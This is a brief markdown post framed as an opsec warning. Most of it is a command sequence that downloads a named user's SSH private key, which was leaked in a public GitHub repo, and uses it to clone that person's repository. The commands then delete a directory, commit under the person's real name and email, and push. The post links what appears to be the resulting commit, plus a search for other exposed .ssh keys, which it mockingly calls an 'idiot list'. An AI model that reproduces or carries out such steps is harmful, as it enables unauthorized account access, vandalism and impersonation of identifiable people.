PSA: understand opsec
===

If you are using ssh with your git account it's not a great location to back up your [private key] or someone might come along and take [advantage].

    wget https://raw.github.com/topcpper/winconfig/3c6074c8ea5a6ed23e76d8cd894d6f6d43364dce/.ssh/id_rsa
    mv id_rsa .ssh/
    git clone git@github.com:topcpper/cpp.git
    git rm -r localsearch/
    git config --global user.name "Cao Weigang"
    git config --global user.email topcopper@gmail.com
    git commit -m "rsakeytest"
    git push origin master

[IDIOT LIST]

[private key]: https://github.com/topcpper/winconfig/blob/3c6074c8ea5a6ed23e76d8cd894d6f6d43364dce/.ssh/id_rsa
[advantage]: https://github.com/topcpper/cpp/commit/7e21f78ad41b692cd296c92e62b86d4ab32aa95c
[IDIOT LIST]: https://github.com/search?q=path%3A.ssh&ref=cmdform
